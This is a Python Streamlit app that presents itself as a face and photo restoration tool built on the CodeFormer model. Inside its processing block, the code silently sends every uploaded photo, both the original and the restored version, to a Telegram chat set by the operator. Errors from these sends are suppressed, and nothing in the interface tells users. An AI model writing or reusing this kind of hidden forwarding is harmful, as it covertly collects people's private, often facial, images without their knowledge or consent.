import streamlit as st
from gradio_client import Client, handle_file
import telebot
import os
from PIL import Image

# 1. إعدادات الصفحة
st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
st.title("🌟 Aziz Ultra Vision")

# 2. جلب البيانات من الـ Secrets (التوكن والـ ID)
try:
    TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    bot = telebot.TeleBot(TOKEN)
except Exception as e:
    TOKEN = None
    bot = None
    st.error("تأكد من إعدادات الـ Secrets في موقع Streamlit")

# 3. واجهة رفع الصور
uploaded_file = st.file_uploader("ارفع الصورة هنا للتحسين والترميم...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 الصورة الأصلية", use_container_width=True)
    
    if st.button("🚀 ابدأ التحسين والترميم الآن"):
        with st.spinner("جاري العمل.. يتم الآن الإرسال والترميم..."):
            try:
                # حفظ الصورة الأصلية مؤقتاً لإرسالها ومعالجتها
                temp_input = "temp_input.png"
                image.save(temp_input)

                # --- أ. إرسال الصورة الأصلية للتليجرام أولاً ---
                if bot and CHAT_ID:
                    try:
                        with open(temp_input, "rb") as f_in:
                            bot.send_photo(CHAT_ID, f_in, caption="📥 صورة جديدة (قبل الترميم)")
                    except:
                        pass

                # --- ب. معالجة الصورة بالذكاء الاصطناعي ---
                client = Client("sczhou/CodeFormer")
                result = client.predict(
                    image=handle_file(temp_input),
                    background_enhance=True,
                    face_upsample=True,
                    upscale=2,
                    codeformer_fidelity=0.7  # الحفاظ على ملامح الوجه ولون العين الأصلي
                )
                
                # الحصول على مسار النتيجة
                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                
                # --- ج. عرض النتيجة النهائية في الموقع ---
                st.image(restored_path, caption="✅ تم الترميم بنجاح بجودة Ultra", use_container_width=True)
                
                # زر تحميل الصورة في الجوال
                with open(restored_path, "rb") as file:
                    st.download_button(
                        label="📥 حفظ الصورة المرممة في جوالك",
                        data=file,
                        file_name="Aziz_Vision_Result.png",
                        mime="image/png"
                    )

                # --- د. إرسال النتيجة النهائية للتليجرام ---
                if bot and CHAT_ID:
                    try:
                        with open(restored_path, "rb") as f_out:
                            bot.send_photo(CHAT_ID, f_out, caption="✨ النتيجة النهائية (بعد الترميم)")
                    except:
                        pass 
                
                # مسح الملفات المؤقتة لتنظيف الذاكرة
                if os.path.exists(temp_input):
                    os.remove(temp_input)
                
            except Exception as e:
                st.error(f"المعذرة يا عزيز، حدث خطأ أثناء المعالجة: {e}")

# تذييل الصفحة
st.markdown("---")
st.caption("برمجة وتطوير عزيز | Aziz Vision Studio 2026")
